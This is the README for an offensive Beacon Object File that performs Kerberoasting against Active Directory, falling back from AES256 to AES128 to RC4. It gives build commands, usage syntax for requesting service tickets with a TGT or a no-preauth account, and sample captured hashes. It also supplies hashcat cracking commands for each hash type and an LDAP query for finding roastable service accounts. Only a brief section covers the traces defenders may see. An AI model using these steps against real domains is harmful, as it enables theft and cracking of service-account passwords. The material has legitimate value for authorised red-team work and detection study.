# kerberoasting-aes-fallback

A Beacon Object File (BOF) for Kerbeus-BOF that performs Kerberoasting with automatic etype negotiation. Unlike the original `kerberoasting` BOF which hardcodes RC4, this variant attempts **AES256 → AES128 → RC4** in order and uses the highest encryption type the service account supports.

---

## Background

The original Kerberoasting implementation requests service tickets with `rc4_hmac` (etype 23) hardcoded. This produces `$krb5tgs$23$` hashes regardless of what the target service account actually supports.

This BOF adds etype negotiation:

1. Sends a TGS-REQ with AES256 (etype 18)
2. If the KDC returns `KDC_ERR_ETYPE_NOSUPP`, falls back to AES128 (etype 17)
3. If that also fails, falls back to RC4 (etype 23)
4. On any other KDC error, aborts immediately

> **Note:** If the service account has no `msDS-SupportedEncryptionTypes` configured (attribute absent or value 0), the KDC will silently downgrade the ticket to RC4 even when AES is requested — no error is returned. The BOF detects this and logs it explicitly. This is a property of the target account, not a bug in the BOF.

---

## Files

```
kerberoasting/
└── kerberoasting-aes-fallback.c   ← source

_bin/Kerbeus-BOF/
└── kerberoasting-aes-fallback.x64.o  ← compiled object
```

---

## Building

```bash
cd ~/Extension-Kit/AD-BOF/Kerbeus-BOF

x86_64-w64-mingw32-gcc \
  -I ./ -w -Wno-incompatible-pointer-types -Os -s -DBOF -c \
  kerberoasting/kerberoasting-aes-fallback.c \
  -o _bin/Kerbeus-BOF/kerberoasting-aes-fallback.x64.o

x86_64-w64-mingw32-strip --strip-unneeded \
  _bin/Kerbeus-BOF/kerberoasting-aes-fallback.x64.o
```

Verify the object:

```bash
file _bin/Kerbeus-BOF/kerberoasting-aes-fallback.x64.o
# PE32+ relocatable (x86-64), for MS Windows

x86_64-w64-mingw32-objdump -t _bin/Kerbeus-BOF/kerberoasting-aes-fallback.x64.o | grep go
# Should show 'go' entrypoint
```

To include in `make`:

```makefile
@($(CC64) $(CFLAGS) kerberoasting/kerberoasting-aes-fallback.c \
  -o _bin/Kerbeus-BOF/kerberoasting-aes-fallback.x64.o && \
  $(STRIP64) _bin/Kerbeus-BOF/kerberoasting-aes-fallback.x64.o) && \
  echo '[+] kerberoasting-aes-fallback' || echo '[!] kerberoasting-aes-fallback'
```

---

## Usage

### With a TGT (kirbi base64)

```
kerbeus kerberoasting-aes-fallback /spn:MSSQLSvc/sql.domain.local /ticket:<base64>
```

### With a no-preauth account

```
kerbeus kerberoasting-aes-fallback /spn:MSSQLSvc/sql.domain.local /nopreauth:svc_nopreauth /domain:domain.local /dc:10.x.x.x
```

### Arguments

| Argument | Required | Description |
|---|---|---|
| `/spn:` | Yes | Target SPN |
| `/ticket:` | Yes* | Base64 kirbi TGT |
| `/nopreauth:` | Yes* | Username of account with pre-auth disabled |
| `/domain:` | No | Target domain (auto-detected if omitted) |
| `/dc:` | No | Domain controller IP/hostname (auto-detected if omitted) |

\* Either `/ticket` or `/nopreauth` must be supplied.

---

## Output

### AES256 obtained

```
[*] Trying etype AES256 (18)...
[*] Building TGS-REQ (etype 18) for: 'MSSQLSvc/sql.domain.local'
[+] TGS request successful!
[+] Got ticket with etype AES256 (18)

$krb5tgs$18$*USER$DOMAIN.LOCAL$MSSQLSvc/sql.domain.local*$<checksum>$<cipher>
```

### AES256 requested but service account only has RC4 keys

```
[*] Trying etype AES256 (18)...
[*] Building TGS-REQ (etype 18) for: 'MSSQLSvc/sql.domain.local'
[+] TGS request successful!
[+] Got ticket with etype RC4 (23)
[*] Note: requested AES256 but ticket encrypted with RC4 (service account keyset)
[*] Service account likely missing msDS-SupportedEncryptionTypes for AES

$krb5tgs$23$*USER$DOMAIN.LOCAL$MSSQLSvc/sql.domain.local*$<checksum>$<cipher>
```

### Fallback triggered

```
[*] Trying etype AES256 (18)...
[-] KDC does not support etype AES256, trying lower...
[*] Trying etype AES128 (17)...
[+] TGS request successful!
[+] Got ticket with etype AES128 (17)

$krb5tgs$17$*USER$DOMAIN.LOCAL$MSSQLSvc/sql.domain.local*$<checksum>$<cipher>
```

---

## Cracking

### AES256 (`$krb5tgs$18$`)

```bash
hashcat -m 19700 -a 0 hash.txt wordlist.txt
```

### AES128 (`$krb5tgs$17$`)

```bash
hashcat -m 19600 -a 0 hash.txt wordlist.txt
```

### RC4 (`$krb5tgs$23$`)

```bash
hashcat -m 13100 -a 0 hash.txt wordlist.txt
```

RC4 cracks significantly faster than AES. If the service account has no AES keys configured, RC4 output is expected and not a failure condition.

---

## Identifying AES-capable service accounts

To find kerberoastable accounts that actually support AES (where this BOF will produce AES hashes):

```
ldapsearch (&(servicePrincipalName=*)(msDS-SupportedEncryptionTypes:1.2.840.113556.1.4.803:=8)(!(userAccountControl:1.2.840.113556.1.4.803:=2))) -a *
```

Bit 3 (`0x8`) in `msDS-SupportedEncryptionTypes` = AES256 supported. If this attribute is absent or 0 on a service account, expect RC4 output regardless of requested etype.

---

## Detection

This BOF will trigger `KDC_ERR_ETYPE_NOSUPP` noise on the DC if AES is not supported, which standard RC4-only kerberoasting does not produce. Defenders with DC event log coverage may see etype negotiation attempts (Event ID 4769) with unusual etype sequences before a successful RC4 ticket issuance.

---

## Credits

Based on [Kerbeus-BOF](https://github.com/RalfHacker/Kerbeus-BOF) by RalfHacker.  
Etype negotiation logic added by 0xGunrunner.
